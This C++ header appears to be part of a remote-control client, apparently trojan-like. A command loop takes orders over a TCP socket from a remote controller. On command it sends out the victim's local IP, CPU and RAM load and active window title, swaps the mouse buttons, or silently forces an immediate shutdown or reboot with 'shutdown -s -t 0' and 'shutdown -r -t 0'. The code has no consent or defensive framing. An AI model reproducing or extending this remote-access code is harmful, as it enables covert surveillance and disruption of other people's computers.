#pragma once

bool GetInfo(SOCKET Sock)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;

	json j;

    j["IPL"] = TcpIP::GetLocalIP(Sock);
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = "TODO";

	return COMUNICAZIONI::GetInfo(Sock, j.dump());
}

bool InvertMouse(SOCKET Sock)
{
	MouseUtils mu;

	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
}

short Sessione(TcpIP Client)
{
	SystemUtils su;
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			i = false;
		else if (cmd == "getinfo")
		{
			if (!GetInfo(Client.Sock))
				i = false;
		}
		else if (cmd == "invertmouse")
		{
			if (!InvertMouse(Client.Sock))
				i = false;
		}
		else if (cmd == "reconnect")
			i = false;
		else if (cmd == "kill")
			return 1;
		else if (cmd == "shutdown")
		{
			su.NoOutputCMD("shutdown -s -t 0");
			return 1;
		}
		else if (cmd == "reboot")
		{
			su.NoOutputCMD("shutdown -r -t 0");
			return 1;
		}
	}

	return 0;
}